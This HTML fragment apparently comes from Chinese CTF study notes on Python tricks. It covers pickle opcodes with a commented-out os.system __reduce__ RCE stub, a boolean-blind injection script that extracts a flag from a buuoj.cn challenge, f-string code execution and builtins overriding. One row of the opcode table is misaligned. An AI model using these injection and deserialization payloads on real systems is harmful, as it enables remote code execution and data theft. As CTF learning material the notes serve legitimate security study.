+<h2 id="repr-&#x51FD;&#x6570;&#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4F9B;&#x89E3;&#x91CA;&#x5668;&#x8BFB;&#x53D6;&#x7684;&#x5F62;&#x5F0F;"><a name="repr-&#x51FD;&#x6570;&#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4F9B;&#x89E3;&#x91CA;&#x5668;&#x8BFB;&#x53D6;&#x7684;&#x5F62;&#x5F0F;" class="anchor-navigation-ex-anchor" href="#repr-&#x51FD;&#x6570;&#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4F9B;&#x89E3;&#x91CA;&#x5668;&#x8BFB;&#x53D6;&#x7684;&#x5F62;&#x5F0F;"><i class="fa fa-link" aria-hidden="true"></i></a>repr() &#x51FD;&#x6570;&#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4F9B;&#x89E3;&#x91CA;&#x5668;&#x8BFB;&#x53D6;&#x7684;&#x5F62;&#x5F0F;</h2>
+<p>&#x53EF;&#x4EE5;&#x4E0E;php serialize()&#x7C7B;&#x6BD4;</p>
+<h2 id="opcode-&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;"><a name="opcode-&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;" class="anchor-navigation-ex-anchor" href="#opcode-&#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;"><i class="fa fa-link" aria-hidden="true"></i></a>opcode &#x7684;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;</h2>
+<p>&#x8F93;&#x51FA;opcode&#x8868;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> pickletools
+<span class="hljs-keyword">import</span> prettytable
+
+opcode_table = prettytable.PrettyTable()
+opcode_table.field_names = [<span class="hljs-string">&apos;Name&apos;</span>, <span class="hljs-string">&apos;Code&apos;</span>, <span class="hljs-string">&apos;Docs&apos;</span>]
+<span class="hljs-keyword">for</span> opcode <span class="hljs-keyword">in</span> pickletools.opcodes:
+    opcode_table.add_row([opcode.name, opcode.code, opcode.doc.splitlines()[<span class="hljs-number">0</span>]])
+
+print(opcode_table)
+</code></pre>
+<pre><code>+------------------+------+-----------------------------------------------------------------+
+|       Name       | Code |                               Docs                              |
++------------------+------+-----------------------------------------------------------------+
+|       INT        |  I   |                     Push an integer or bool.                    |
+|      BININT      |  J   |                 Push a four-byte signed integer.                |
+|     BININT1      |  K   |                Push a one-byte unsigned integer.                |
+|     BININT2      |  M   |                Push a two-byte unsigned integer.                |
+|       LONG       |  L   |                       Push a long integer.                      |
+|      LONG1       |      |               Long integer using one-byte length.               |
+|      LONG4       |      |              Long integer using found-byte length.              |
+|      STRING      |  S   |                   Push a Python string object.                  |
+|    BINSTRING     |  T   |                   Push a Python string object.                  |
+| SHORT_BINSTRING  |  U   |                   Push a Python string object.                  |
+|     BINBYTES     |  B   |                   Push a Python bytes object.                   |
+|  SHORT_BINBYTES  |  C   |                   Push a Python bytes object.                   |
+|    BINBYTES8     |      |                   Push a Python bytes object.                   |
+|    BYTEARRAY8    |      |                 Push a Python bytearray object.                 |
+|   NEXT_BUFFER    |      |                Push an out-of-band buffer object.               |
+| READONLY_BUFFER  |      |                    Push True onto the stack.                    |
+|     NEWFALSE     |      |                    Push False onto the stack.                   |
+|     UNICODE      |  V   |               Push a Python Unicode string object.              |
+| SHORT_BINUNICODE |      |               Push a Python Unicode string object.              |
+|    BINUNICODE    |  X   |               Push a Python Unicode string object.              |
+|   BINUNICODE8    |      |               Push a Python Unicode string object.              |
+|      FLOAT       |  F   |            Newline-terminated decimal float literal.            |
+|     BINFLOAT     |  G   |        Float stored in binary form, with 8 bytes of data.       |
+|    EMPTY_LIST    |  ]   |                       Push an empty list.                       |
+|      APPEND      |  a   |                   Append an object to a list.                   |
+|     APPENDS      |  e   |            Extend a list by a slice of stack objects.           |
+|       LIST       |  l   |  Build a list out of the topmost stack slice, after markobject. |
+|   EMPTY_TUPLE    |  )   |                       Push an empty tuple.                      |
+|      TUPLE       |  t   | Build a tuple out of the topmost stack slice, after markobject. |
+|      TUPLE1      |      |     Build a one-tuple out of the topmost item on the stack.     |
+|      TUPLE2      |      |     Build a two-tuple out of the top two items on the stack.    |
+|      TUPLE3      |      |   Build a three-tuple out of the top three items on the stack.  |
+|    EMPTY_DICT    |  }   |                       Push an empty dict.                       |
+|       DICT       |  d   |  Build a dict out of the topmost stack slice, after markobject. |
+|     SETITEM      |  s   |            Add a key+value pair to an existing dict.            |
+|     SETITEMS     |  u   | Add an arbitrary number of key+value pairs to an existing dict. |
+|    EMPTY_SET     |      |                        Push an empty set.                       |
+|     ADDITEMS     |      |  Build a frozenset out of the topmost slice, after markobject.  |
+|       POP        |  0   |   Discard the top stack item, shrinking the stack by one item.  |
+|       DUP        |  2   |  Push the top stack item onto the stack again, duplicating it.  |
+|       MARK       |  (   |                 Push markobject onto the stack.                 |
+|     POP_MARK     |  1   |  Pop all the stack objects at and above the topmost markobject. |
+|       GET        |  g   |      Read an object from the memo and push it on the stack.     |
+|      BINGET      |  h   |      Read an object from the memo and push it on the stack.     |
+|   LONG_BINGET    |  j   |      Read an object from the memo and push it on the stack.     |
+|       PUT        |  p   |   Store the stack top into the memo.  The stack is not popped.  |
+|      BINPUT      |  q   |   Store the stack top into the memo.  The stack is not popped.  |
+|   LONG_BINPUT    |  r   |   Store the stack top into the memo.  The stack is not popped.  |
+|     MEMOIZE      |      |   Store the stack top into the memo.  The stack is not popped.  |
+|       EXT1       |      |                         Extension code.                         |
+|       EXT2       |      |                         Extension code.                         |
+|       EXT4       |      |                         Extension code.                         |
+|      GLOBAL      |  c   |         Push a global object (module.attr) on the stack.        |
+|   STACK_GLOBAL   |      |         Push a global object (module.attr) on the stack.        |
+|      REDUCE      |  R   |   Push an object built from a callable and an argument tuple.   |
+|      BUILD       |  b   |   Finish building an object, via __setstate__ or dict update.   |
+|       INST       |  i   |                     Build a class instance.                     |
+|       OBJ        |  o   |                     Build a class instance.                     |
+|      NEWOBJ      |      |                    Build an object instance.                    |
+|    NEWOBJ_EX     |      |                    Build an object instance.                    |
+|      PROTO       |      |                   Protocol version indicator.                   |
+|       STOP       |  .   |                   Stop the unpickling machine.                  |
+|      FRAME       |      |              Indicate the beginning of a new frame.             |
+|      PERSID      |  P   |          Push an object identified by a persistent ID.          |
+|    BINPERSID     |  Q   |          Push an object identified by a persistent ID.          |
++------------------+------+-----------------------------------------------------------------+
+</code></pre><p>Example:</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> pickle 
+<span class="hljs-comment">#import sys</span>
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> pickletools
+
+<span class="hljs-comment">#COMMAND = &quot;ls&quot;</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PickleRce</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>
+        super(PickleRce, self).__init__()
+        self.id = <span class="hljs-number">1</span>
+        self.name =<span class="hljs-string">&quot;eki&quot;</span>
+    <span class="hljs-comment">#def __reduce__(self):</span>
+    <span class="hljs-comment">#    import os</span>
+    <span class="hljs-comment">#    return (os.system,(COMMAND,))</span>
+x = PickleRce()
+s = pickle.dumps(x)
+
+pickletools.dis(s)
+</code></pre>
+<h3 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3>
+<p>&#x7ED5;&#x8FC7; RestrictedUnpickler&#xFF1A;<a href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/" target="_blank">http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/</a></p>
+<p>&#x4ECE;&#x96F6;&#x5F00;&#x59CB;python&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;&#xFF1A;pickle&#x539F;&#x7406;&#x89E3;&#x6790; &amp; &#x4E0D;&#x7528;reduce&#x7684;RCE&#x59FF;&#x52BF;  <a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank">https://zhuanlan.zhihu.com/p/89132768</a></p>
+<h2 id="&#x5B57;&#x7B26;&#x4E32;bool"><a name="&#x5B57;&#x7B26;&#x4E32;bool" class="anchor-navigation-ex-anchor" href="#&#x5B57;&#x7B26;&#x4E32;bool"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5B57;&#x7B26;&#x4E32;bool</h2>
+<pre><code>&gt;&gt;&gt; &apos;a&apos; and True
+True
+&gt;&gt;&gt; &apos;a&apos; and False
+False
+&gt;&gt;&gt; True and False
+False
+&gt;&gt;&gt; &apos;a&apos; or False
+&apos;a&apos;
+&gt;&gt;&gt; True or False
+True
+&gt;&gt;&gt; False or True
+True
+</code></pre><p>&#x5B58;&#x5728;&#x7C7B;&#x4F3C;SQL Bool Blind&#x7684;&#x6CE8;&#x5165;</p>
+<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> string
+
+pt= string.printable
+
+url=<span class="hljs-string">&quot;http://992b9ff2-9950-49ec-8925-4fa34293d8a6.node3.buuoj.cn/&quot;</span>
+
+ret = <span class="hljs-string">&quot;flag{&quot;</span>
+url = url + <span class="hljs-string">&quot;cgi-bin/pycalx.py&quot;</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    l = <span class="hljs-number">1</span>
+    r = <span class="hljs-number">128</span>
+    <span class="hljs-keyword">while</span>(l+<span class="hljs-number">1</span>&lt;r):
+        mid = (l+r) / <span class="hljs-number">2</span>
+        tmp=ret+chr(mid)
+        data = {
+            <span class="hljs-string">&apos;value1&apos;</span>: <span class="hljs-string">&apos;a&apos;</span>,
+            <span class="hljs-string">&apos;op&apos;</span>: <span class="hljs-string">&apos;+\&apos;&apos;</span>,
+            <span class="hljs-string">&apos;value2&apos;</span>: <span class="hljs-string">&apos;and source&gt;FLAG#&apos;</span>,
+            <span class="hljs-string">&apos;source&apos;</span>: tmp
+        }
+        req=requests.post(url,data=data)
+        <span class="hljs-comment">#print req.text</span>
+        <span class="hljs-keyword">if</span> (req.status_code != requests.codes.ok):
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;True&quot;</span> <span class="hljs-keyword">in</span> req.text:
+            r=mid
+        <span class="hljs-keyword">else</span> :
+            l=mid
+    <span class="hljs-keyword">if</span>(chr(l) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> pt):
+        <span class="hljs-keyword">break</span>
+    ret=ret+chr(l)
+    sys.stdout.write(<span class="hljs-string">&quot;[-]Result : -&gt; {0} &lt;-\r&quot;</span>.format(ret))
+    sys.stdout.flush()
+
+print(<span class="hljs-string">&quot;[+]Result : -&gt;&quot;</span>+ret+<span class="hljs-string">&quot;&lt;-&quot;</span>)
+</code></pre>
+<h2 id="&#x6D6E;&#x70B9;&#x6570;&#x6BD4;&#x8F83;"><a name="&#x6D6E;&#x70B9;&#x6570;&#x6BD4;&#x8F83;" class="anchor-navigation-ex-anchor" href="#&#x6D6E;&#x70B9;&#x6570;&#x6BD4;&#x8F83;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x6D6E;&#x70B9;&#x6570;&#x6BD4;&#x8F83;</h2>
+<p><code>float()</code></p>
+<p><code>inf,nan,infinity</code></p>
+<h2 id="python3-f"><a name="python3-f" class="anchor-navigation-ex-anchor" href="#python3-f"><i class="fa fa-link" aria-hidden="true"></i></a>python3 <code>f&apos;{}&apos;</code></h2>
+<p>&#x5728;python3.6&#x4E2D;&#xFF0C;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x7528;{}&#x5F15;&#x8D77;&#x6765;&#xFF0C;&#x52A0;&#x4E0A;&#x5F15;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x524D;&#x9762;&#x52A0;&#x4E2A;f&#x5C31;&#x53EF;&#x4EE5;&#x628A;{}&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x505A;&#x4EE3;&#x7801;&#x6267;&#x884C;</p>
+<p><code>f&quot;{__import__(&apos;time&apos;).sleep(1)}&quot;</code></p>
+<h2 id="&#x51FD;&#x6570;&#x91CD;&#x8F7D;"><a name="&#x51FD;&#x6570;&#x91CD;&#x8F7D;" class="anchor-navigation-ex-anchor" href="#&#x51FD;&#x6570;&#x91CD;&#x8F7D;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x51FD;&#x6570;&#x91CD;&#x8F7D;</h2>
+<p>python&#x652F;&#x6301;&#x52A8;&#x6001;&#x4FEE;&#x6539;&#x51FD;&#x6570;</p>
+<p>&#x6BD4;&#x5982;</p>
+<pre><code class="lang-python">__builtins__.ord=__builtins__.print
+ord(&quot;1&quot;)
+-&gt; 1
+</code></pre>
+<p>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;python&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x4E5F;&#x662F;&#x5BF9;&#x8C61;</p>
+<p>python&#x7684;&#x5BF9;&#x8C61;&#x6709;&#x5F88;&#x591A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;</p>
+<pre><code class="lang-python">__new__(cls[, ...])    <span class="hljs-number">1.</span> __new__ &#x662F;&#x5728;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x65F6;&#x5019;&#x6240;&#x8C03;&#x7528;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;
+__init__(self[, ...])    &#x6784;&#x9020;&#x5668;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x88AB;&#x521B;&#x5EFA;&#x7684;&#x65F6;&#x5019;&#x8C03;&#x7528;&#x7684;&#x521D;&#x59CB;&#x5316;&#x65B9;&#x6CD5;
+__del__(self)    &#x6790;&#x6784;&#x5668;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x88AB;&#x9500;&#x6BC1;&#x7684;&#x65F6;&#x5019;&#x8C03;&#x7528;&#x7684;&#x65B9;&#x6CD5;
+__call__(self[, args...])    &#x5141;&#x8BB8;&#x4E00;&#x4E2A;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x50CF;&#x51FD;&#x6570;&#x4E00;&#x6837;&#x88AB;&#x8C03;&#x7528;&#xFF1A;x(a, b) &#x8C03;&#x7528; x.__call__(a, b)
+__len__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; len() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__repr__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; repr() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__str__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; str() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__bytes__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; bytes() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__hash__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; hash() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__bool__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; bool() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x5E94;&#x8BE5;&#x8FD4;&#x56DE; <span class="hljs-keyword">True</span> &#x6216; <span class="hljs-keyword">False</span>
+__format__(self, format_spec)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; format() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+ &#x6709;&#x5173;&#x5C5E;&#x6027;
+__getattr__(self, name)    &#x5B9A;&#x4E49;&#x5F53;&#x7528;&#x6237;&#x8BD5;&#x56FE;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__getattribute__(self, name)    &#x5B9A;&#x4E49;&#x5F53;&#x8BE5;&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#x88AB;&#x8BBF;&#x95EE;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__setattr__(self, name, value)    &#x5B9A;&#x4E49;&#x5F53;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x88AB;&#x8BBE;&#x7F6E;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__delattr__(self, name)    &#x5B9A;&#x4E49;&#x5F53;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x88AB;&#x5220;&#x9664;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__dir__(self)    &#x5B9A;&#x4E49;&#x5F53; dir() &#x88AB;&#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__get__(self, instance, owner)    &#x5B9A;&#x4E49;&#x5F53;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x503C;&#x88AB;&#x53D6;&#x5F97;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__set__(self, instance, value)    &#x5B9A;&#x4E49;&#x5F53;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x503C;&#x88AB;&#x6539;&#x53D8;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__delete__(self, instance)    &#x5B9A;&#x4E49;&#x5F53;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x503C;&#x88AB;&#x5220;&#x9664;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+ &#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#x7B26;
+__lt__(self, other)    &#x5B9A;&#x4E49;&#x5C0F;&#x4E8E;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;x &lt; y &#x8C03;&#x7528; x.__lt__(y)
+__le__(self, other)    &#x5B9A;&#x4E49;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;x &lt;= y &#x8C03;&#x7528; x.__le__(y)
+__eq__(self, other)    &#x5B9A;&#x4E49;&#x7B49;&#x4E8E;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;x == y &#x8C03;&#x7528; x.__eq__(y)
+__ne__(self, other)    &#x5B9A;&#x4E49;&#x4E0D;&#x7B49;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;x != y &#x8C03;&#x7528; x.__ne__(y)
+__gt__(self, other)    &#x5B9A;&#x4E49;&#x5927;&#x4E8E;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;x &gt; y &#x8C03;&#x7528; x.__gt__(y)
+__ge__(self, other)    &#x5B9A;&#x4E49;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;x &gt;= y &#x8C03;&#x7528; x.__ge__(y)
+ &#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;
+__add__(self, other)    &#x5B9A;&#x4E49;&#x52A0;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;+
+__sub__(self, other)    &#x5B9A;&#x4E49;&#x51CF;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;-
+__mul__(self, other)    &#x5B9A;&#x4E49;&#x4E58;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;*
+__truediv__(self, other)    &#x5B9A;&#x4E49;&#x771F;&#x9664;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;/
+__floordiv__(self, other)    &#x5B9A;&#x4E49;&#x6574;&#x6570;&#x9664;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;//
+__mod__(self, other)    &#x5B9A;&#x4E49;&#x53D6;&#x6A21;&#x7B97;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;%
+__divmod__(self, other)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; divmod() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__pow__(self, other[, modulo])    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; power() &#x8C03;&#x7528;&#x6216; ** &#x8FD0;&#x7B97;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__lshift__(self, other)    &#x5B9A;&#x4E49;&#x6309;&#x4F4D;&#x5DE6;&#x79FB;&#x4F4D;&#x7684;&#x884C;&#x4E3A;&#xFF1A;&lt;&lt;
+__rshift__(self, other)    &#x5B9A;&#x4E49;&#x6309;&#x4F4D;&#x53F3;&#x79FB;&#x4F4D;&#x7684;&#x884C;&#x4E3A;&#xFF1A;&gt;&gt;
+__and__(self, other)    &#x5B9A;&#x4E49;&#x6309;&#x4F4D;&#x4E0E;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;&amp;
+__xor__(self, other)    &#x5B9A;&#x4E49;&#x6309;&#x4F4D;&#x5F02;&#x6216;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;^
+__or__(self, other)    &#x5B9A;&#x4E49;&#x6309;&#x4F4D;&#x6216;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;|
+ &#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x3000;&#x53CD;&#x8FD0;&#x7B97;
+__radd__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rsub__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rmul__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rtruediv__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rfloordiv__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rmod__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rdivmod__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rpow__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rlshift__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rrshift__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rand__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__rxor__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+__ror__(self, other)    &#xFF08;&#x4E0E;&#x4E0A;&#x65B9;&#x76F8;&#x540C;&#xFF0C;&#x5F53;&#x5DE6;&#x64CD;&#x4F5C;&#x6570;&#x4E0D;&#x652F;&#x6301;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF09;
+&#x589E;&#x91CF;&#x8D4B;&#x503C;&#x8FD0;&#x7B97;
+__iadd__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x52A0;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;+=
+__isub__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x51CF;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;-=
+__imul__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x4E58;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;*=
+__itruediv__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x771F;&#x9664;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;/=
+__ifloordiv__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x6574;&#x6570;&#x9664;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;//=
+__imod__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x53D6;&#x6A21;&#x7B97;&#x6CD5;&#x7684;&#x884C;&#x4E3A;&#xFF1A;%=
+__ipow__(self, other[, modulo])    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x5E42;&#x8FD0;&#x7B97;&#x7684;&#x884C;&#x4E3A;&#xFF1A;**=
+__ilshift__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x6309;&#x4F4D;&#x5DE6;&#x79FB;&#x4F4D;&#x7684;&#x884C;&#x4E3A;&#xFF1A;&lt;&lt;=
+__irshift__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x6309;&#x4F4D;&#x53F3;&#x79FB;&#x4F4D;&#x7684;&#x884C;&#x4E3A;&#xFF1A;&gt;&gt;=
+__iand__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x6309;&#x4F4D;&#x4E0E;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;&amp;=
+__ixor__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x6309;&#x4F4D;&#x5F02;&#x6216;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;^=
+__ior__(self, other)    &#x5B9A;&#x4E49;&#x8D4B;&#x503C;&#x6309;&#x4F4D;&#x6216;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;|=
+ &#x4E00;&#x5143;&#x64CD;&#x4F5C;&#x7B26;
